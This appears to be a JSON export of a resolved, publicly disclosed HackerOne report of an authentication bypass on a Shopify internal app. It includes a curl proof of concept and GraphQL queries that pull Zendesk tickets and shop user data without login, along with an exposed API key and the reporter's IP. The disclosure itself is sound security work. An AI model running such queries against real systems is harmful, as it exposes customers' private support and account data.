{"id":397130,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTcxMzA=","url":"https://hackerone.com/reports/397130","title":"Unauthenticated access to Zendesk tickets through athena-flex-production.shopifycloud.com Okta bypass","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-08-20T00:14:05.542Z","submitted_at":"2018-08-20T00:14:05.542Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"rijalrojan","url":"/rijalrojan","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-09-19T16:15:49.202Z","bug_reporter_agreed_on_going_public_at":"2018-09-19T16:15:48.930Z","team_member_agreed_on_going_public_at":"2018-09-19T14:53:56.702Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary**\n\nathena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information. \n\n**Description**\n\nWhen you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do `view-source:athena-flex-production.shopifycloud.com` in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website: \n\nhttps://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\n\nWhen you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to. \n\nFor my test I sent: \n\n```\n{\"query\": \"query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}\n```\n\nWhat this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data. \n\nI don't want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact support@hackerone.com later if you wish to disclose the report. \n\n\n**Reproduction**\n1. Send the following curl request: \n\n```\ncurl -i -s -k  -X $'POST' \\\n    -H $'Host: athena-flex-production.shopifycloud.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 422' \\\n    --data-binary $'{\\\"query\\\": \\\"query getRecentTicketsQuery($domain: String) {\\\\n    shop(myshopifyDomain: $domain) {\\\\n      zendesk {\\\\n        tickets(last: 5) {\\\\n          edges {\\\\n            node {\\\\n              id\\\\n               requester {\\\\n                name\\\\n              }\\\\n              subject\\\\n              description\\\\n              }\\\\n          }\\\\n        }\\\\n      }\\\\n    }\\\\n  }\\\\n\\\",\\\"variables\\\":{\\\"domain\\\":\\\"ok.myshopify.com\\\"}}' \\\n    $'https://athena-flex-production.shopifycloud.com/graphql'\n```\n\n**More information**\n\nThere is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure: \n\n```\nR = n.n(O)()({\n apiKey: \"5c0246635b3c77189888c0b10d3427ac\",\n notifyReleaseStages: [\"production\"],\n releaseStage: \"production\" \n}),\n```\n\n## Impact\n\n1. Get ticket description means dumping any detail you want. \n2. Creating zendesk ticket in behalf of other agents. \n3. Changing state of other tickets. \n\n**I will post list of all functions that is possible in this graphql.**","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eathena-flex-production.shopifycloud.com seems to be an internal system that Shopify uses because it redirects user to Okta login. During this however, I noticed that it first returns 200 and then does a redirect meaning some part of the website loads before redirecting. With this, I was able to get the JS being used in the system. Through the JS file, I found a path that allows GraphQL queries thus resulting in a full dump of Zendesk ticket information. \u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eWhen you originally go to athena-flex-production.shopifycloud.com you will find that it will redirect to Okta. However if you do \u003ccode\u003eview-source:athena-flex-production.shopifycloud.com\u003c/code\u003e in Chrome, it will show that the website loads momentarily. In one of the script src, there is this link requested by the website: \u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\" href=\"/redirect?url=https%3A%2F%2Fcdn.shopifycloud.com%2Fathena-flex%2Fassets%2Fmain-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cdn.shopifycloud.com/athena-flex/assets/main-3fe2559f5e86bcc7d88fe611b71942faa73e787afbc2126a601662ab254a36fc.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhen you beautify the JS file you will notice it has some query data that can be used at the /graphql endpoint. After I got this, I started to play around with the GraphQL schema and see what I could gain access to. \u003c/p\u003e\n\n\u003cp\u003eFor my test I sent: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;query\u0026quot;: \u0026quot;query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\u0026quot;,\u0026quot;variables\u0026quot;:{\u0026quot;domain\u0026quot;:\u0026quot;ok.myshopify.com\u0026quot;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhat this query says is: Return last 5 tickets with description, reporter name and subject of the ticket that contain domain ok.myshopify.com. Once the query was done, it responded with 9,259 bytes of JSON response that contained extremely critical data. \u003c/p\u003e\n\n\u003cp\u003eI don\u0026#39;t want to paste the data here for obvious reason but I am attacking the file here so you can delete it by contact \u003ca title=\"support@hackerone.com\" href=\"mailto:support@hackerone.com\" rel=\"nofollow noopener noreferrer\"\u003esupport@hackerone.com\u003c/a\u003e later if you wish to disclose the report. \u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eReproduction\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eSend the following curl request: \u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -s -k  -X $\u0026#39;POST\u0026#39; \\\n    -H $\u0026#39;Host: athena-flex-production.shopifycloud.com\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Content-Type: application/json\u0026#39; -H $\u0026#39;Connection: close\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;Content-Length: 422\u0026#39; \\\n    --data-binary $\u0026#39;{\\\u0026quot;query\\\u0026quot;: \\\u0026quot;query getRecentTicketsQuery($domain: String) {\\\\n    shop(myshopifyDomain: $domain) {\\\\n      zendesk {\\\\n        tickets(last: 5) {\\\\n          edges {\\\\n            node {\\\\n              id\\\\n               requester {\\\\n                name\\\\n              }\\\\n              subject\\\\n              description\\\\n              }\\\\n          }\\\\n        }\\\\n      }\\\\n    }\\\\n  }\\\\n\\\u0026quot;,\\\u0026quot;variables\\\u0026quot;:{\\\u0026quot;domain\\\u0026quot;:\\\u0026quot;ok.myshopify.com\\\u0026quot;}}\u0026#39; \\\n    $\u0026#39;https://athena-flex-production.shopifycloud.com/graphql\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eMore information\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eThere is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eR = n.n(O)()({\n apiKey: \u0026quot;5c0246635b3c77189888c0b10d3427ac\u0026quot;,\n notifyReleaseStages: [\u0026quot;production\u0026quot;],\n releaseStage: \u0026quot;production\u0026quot; \n}),\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eGet ticket description means dumping any detail you want. \u003c/li\u003e\n\u003cli\u003eCreating zendesk ticket in behalf of other agents. \u003c/li\u003e\n\u003cli\u003eChanging state of other tickets. \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eI will post list of all functions that is possible in this graphql.\u003c/strong\u003e\u003c/p\u003e\n","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":48,"voters":["pajoda","secator","mashoud1122","bogdantcaciuc","spam404","sameerphad72","nikitastupin","teknogeek","flashdisk","zombiehelp54","and 38 more..."],"severity":{"rating":"critical","score":9.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":422,"asset_type":"URL","asset_identifier":"partners.shopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3218141,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Easy hot patch for it is to move this completely behind Okta and not load any content on the site before authentication. Additionally, put GraphQL behind auth (require auth token at the least)","markdown_message":"\u003cp\u003eEasy hot patch for it is to move this completely behind Okta and not load any content on the site before authentication. Additionally, put GraphQL behind auth (require auth token at the least)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-20T00:18:32.863Z","updated_at":"2018-08-20T00:23:52.647Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3218153,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There is also another domain vulnerable to this same exact thing: athena-flex.shopifycloud.com. \n\nAlso for Incident response if needed, here is my IP: 76.169.119.108. This is what I used to access the app and use the graphql endpoint.","markdown_message":"\u003cp\u003eThere is also another domain vulnerable to this same exact thing: athena-flex.shopifycloud.com. \u003c/p\u003e\n\n\u003cp\u003eAlso for Incident response if needed, here is my IP: 76.169.119.108. This is what I used to access the app and use the graphql endpoint.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-20T00:40:48.263Z","updated_at":"2018-08-20T00:47:16.667Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3218164,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think this can be more than zendesk because just noticed there is another GraphQL query that probably leads to shop info disclosure. **I cannot investigate it anymore because the site is down**: \n\n```\n\"\\n  query getShopInfo($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      shopInfo {\\n        errors {\\n          code\\n          message\\n        }\\n        id\\n        domain\\n        myshopifyDomain\\n        currency\\n        countryName\\n        createdAt\\n        planDisplayName\\n        planName\\n        planPeriod\\n        timezone\\n        users {\\n          id\\n          firstName\\n          lastName\\n          email\\n          userType\\n          permissions\\n        }\\n      }\\n      reportify(since: 12) {\\n        gmv\\n      }\\n      askPrompts {\\n        edges {\\n          node {\\n            name\\n            url\\n            zendeskTag\\n            openOpportunity\\n            eligible\\n          }\\n        }\\n      }\\n    }\\n  }\\n\n```\n\nI am assuming this can result in more disclosure such as email, name and other information about the user. ","markdown_message":"\u003cp\u003eI think this can be more than zendesk because just noticed there is another GraphQL query that probably leads to shop info disclosure. \u003cstrong\u003eI cannot investigate it anymore because the site is down\u003c/strong\u003e: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026quot;\\n  query getShopInfo($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      shopInfo {\\n        errors {\\n          code\\n          message\\n        }\\n        id\\n        domain\\n        myshopifyDomain\\n        currency\\n        countryName\\n        createdAt\\n        planDisplayName\\n        planName\\n        planPeriod\\n        timezone\\n        users {\\n          id\\n          firstName\\n          lastName\\n          email\\n          userType\\n          permissions\\n        }\\n      }\\n      reportify(since: 12) {\\n        gmv\\n      }\\n      askPrompts {\\n        edges {\\n          node {\\n            name\\n            url\\n            zendeskTag\\n            openOpportunity\\n            eligible\\n          }\\n        }\\n      }\\n    }\\n  }\\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI am assuming this can result in more disclosure such as email, name and other information about the user. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-20T01:02:41.576Z","updated_at":"2018-08-20T01:10:06.683Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3218210,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @rijalrojan,\n\nThank you for your report. We were able to reproduce the issue and our engineering team is working on a fix.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/rijalrojan\"\u003e@rijalrojan\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report. We were able to reproduce the issue and our engineering team is working on a fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-20T01:42:15.668Z","updated_at":"2018-08-20T01:42:15.668Z","actor":{"username":"thisisfine_coffee","cleared":false,"url":"/thisisfine_coffee","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/251/8ce19cedb0a26b34bf6375b2e505d1882b076e88_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3220962,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for the report! We're awarding an initial 500$ after triage and we will determine the final amount once the issue is marked as resolved.","markdown_message":"\u003cp\u003eThank you for the report! We\u0026#39;re awarding an initial 500$ after triage and we will determine the final amount once the issue is marked as resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-20T14:04:03.851Z","updated_at":"2018-08-20T14:04:03.851Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"rijalrojan","url":"/rijalrojan"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3221489,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks! Please let me know if I can be of any help :) \nCheers!\n@rijalrojan ","markdown_message":"\u003cp\u003eThanks! Please let me know if I can be of any help :) \u003cbr\u003e\nCheers!\u003cbr\u003e\n\u003ca href=\"/rijalrojan\"\u003e@rijalrojan\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-20T16:38:58.784Z","updated_at":"2018-08-20T16:38:58.784Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3222493,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This now redirects to OAuth2 login endpoint so the fix so far looks pretty solid. \nCheers!\n@rijalrojan ","markdown_message":"\u003cp\u003eThis now redirects to OAuth2 login endpoint so the fix so far looks pretty solid. \u003cbr\u003e\nCheers!\u003cbr\u003e\n\u003ca href=\"/rijalrojan\"\u003e@rijalrojan\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-20T20:36:55.403Z","updated_at":"2018-08-20T20:36:55.403Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3236207,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I am extremely happy with the fixes being applied. I do daily monitoring of shopifycloud.com subdomains and it seems like a lot of them are moving to either Oauth2 or to GSuite (which also migrated to Okta). Thank you so much for working to fix the bug throughout the subdomains and not just fixing them one by one as the reports came! \n\nCheers!\n@rijalrojan ","markdown_message":"\u003cp\u003eI am extremely happy with the fixes being applied. I do daily monitoring of shopifycloud.com subdomains and it seems like a lot of them are moving to either Oauth2 or to GSuite (which also migrated to Okta). Thank you so much for working to fix the bug throughout the subdomains and not just fixing them one by one as the reports came! \u003c/p\u003e\n\n\u003cp\u003eCheers!\u003cbr\u003e\n\u003ca href=\"/rijalrojan\"\u003e@rijalrojan\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-08-23T15:30:26.605Z","updated_at":"2018-08-23T15:30:26.605Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3303322,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, \nNot to rush things but do you guys have an estimate of when this report can be closed?\nThanks!\n@rijalrojan ","markdown_message":"\u003cp\u003eHi, \u003cbr\u003e\nNot to rush things but do you guys have an estimate of when this report can be closed?\u003cbr\u003e\nThanks!\u003cbr\u003e\n\u003ca href=\"/rijalrojan\"\u003e@rijalrojan\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-06T21:24:00.602Z","updated_at":"2018-09-06T21:24:00.602Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3358457,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @rijalrojan,\n\nWe're good to close this off as resolved now. As you noticed we mitigated this a couple hours after the report but wanted to make sure we did all our due diligence on the Shopify side of things.\n\nOur bounty decision should come through in the next week or so.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/rijalrojan\"\u003e@rijalrojan\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re good to close this off as resolved now. As you noticed we mitigated this a couple hours after the report but wanted to make sure we did all our due diligence on the Shopify side of things.\u003c/p\u003e\n\n\u003cp\u003eOur bounty decision should come through in the next week or so.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-19T13:54:54.231Z","updated_at":"2018-09-19T13:54:54.231Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"rijalrojan","url":"/rijalrojan"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3358759,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We're awarding an additional amount for a total of 5000$ which the top of our bounty range for authentication bypass in this application. Thanks again for the report, looking forward to the next one!","markdown_message":"\u003cp\u003eWe\u0026#39;re awarding an additional amount for a total of 5000$ which the top of our bounty range for authentication bypass in this application. Thanks again for the report, looking forward to the next one!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-19T14:53:40.026Z","updated_at":"2018-09-19T14:53:40.026Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"4500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"rijalrojan","url":"/rijalrojan"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3358762,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-19T14:53:57.250Z","updated_at":"2018-09-19T14:53:57.250Z","first_to_agree":true,"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3359015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@francoischagnon before we go public with this report, can we remove the data.json file because it contains some support ticket infos? \nThanks!\n@rijalrojan ","markdown_message":"\u003cp\u003e\u003ca href=\"/francoischagnon\"\u003e@francoischagnon\u003c/a\u003e before we go public with this report, can we remove the data.json file because it contains some support ticket infos? \u003cbr\u003e\nThanks!\u003cbr\u003e\n\u003ca href=\"/rijalrojan\"\u003e@rijalrojan\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-19T15:59:15.209Z","updated_at":"2018-09-19T15:59:15.209Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3359022,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @rijalrojan,\n\nWe have an email out to HackerOne asking for this data to be removed. Hopefully it'll be responded to soon and we can get this report disclosed :)","markdown_message":"\u003cp\u003eHey \u003ca href=\"/rijalrojan\"\u003e@rijalrojan\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe have an email out to HackerOne asking for this data to be removed. Hopefully it\u0026#39;ll be responded to soon and we can get this report disclosed :)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-19T16:00:31.292Z","updated_at":"2018-09-19T16:00:31.292Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3359041,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also @jack_mccracken for the summary: I think it should be `all zendesk tickets` not `recent zendesk tickets`. For my PoC I did top 5 recent but there were multiple queries that could be done which would in the end dump every zendesk tickets in shopify.zendesk.com. ","markdown_message":"\u003cp\u003eAlso \u003ca href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e for the summary: I think it should be \u003ccode\u003eall zendesk tickets\u003c/code\u003e not \u003ccode\u003erecent zendesk tickets\u003c/code\u003e. For my PoC I did top 5 recent but there were multiple queries that could be done which would in the end dump every zendesk tickets in shopify.zendesk.com. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-19T16:10:17.693Z","updated_at":"2018-09-19T16:10:17.693Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3359058,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"The file is removed. We are good to go public. ","markdown_message":"\u003cp\u003eThe file is removed. We are good to go public. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-19T16:15:49.008Z","updated_at":"2018-09-19T16:15:49.008Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3359059,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-19T16:15:49.233Z","updated_at":"2018-09-19T16:15:49.233Z","actor":{"username":"rijalrojan","cleared":true,"url":"/rijalrojan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fBoPSSRSdMDTghBJexdu4AwG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3359117,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Updated the summary to be more accurate","markdown_message":"\u003cp\u003eUpdated the summary to be more 